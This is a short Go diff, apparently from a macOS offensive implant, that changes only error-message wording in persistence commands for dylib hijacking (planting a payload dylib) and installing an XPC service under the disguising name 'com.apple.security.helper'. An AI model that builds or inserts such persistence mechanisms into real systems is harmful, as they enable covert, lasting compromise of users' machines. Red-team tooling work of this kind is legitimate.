@@ -110,10 +110,10 @@ func findWeakDylibCandidates(searchPath string) []dylibCandidate {
 
 func persistDylibHijackInstall(args persistArgs) structs.CommandResult {
 	if args.Path == "" {
-		return errorResult("Error: path (payload dylib to plant) is required")
+		return errorResult("path (payload dylib to plant) is required")
 	}
 	if args.Name == "" {
-		return errorResult("Error: name (target dylib path to hijack, from scan results) is required")
+		return errorResult("name (target dylib path to hijack, from scan results) is required")
 	}
 
 	if _, err := os.Stat(args.Path); os.IsNotExist(err) {
@@ -142,7 +142,7 @@ func persistDylibHijackInstall(args persistArgs) structs.CommandResult {
 func persistDylibHijackRemove(args persistArgs) structs.CommandResult {
 	target := args.Name
 	if target == "" {
-		return errorResult("Error: name (planted dylib path) is required")
+		return errorResult("name (planted dylib path) is required")
 	}
 
 	if _, err := os.Stat(target); os.IsNotExist(err) {
@@ -169,7 +169,7 @@ func persistXPCService(args persistArgs) structs.CommandResult {
 
 func persistXPCServiceInstall(args persistArgs) structs.CommandResult {
 	if args.Path == "" {
-		return errorResult("Error: path (executable for XPC service) is required")
+		return errorResult("path (executable for XPC service) is required")
 	}
 
 	name := "com.apple.security.helper"
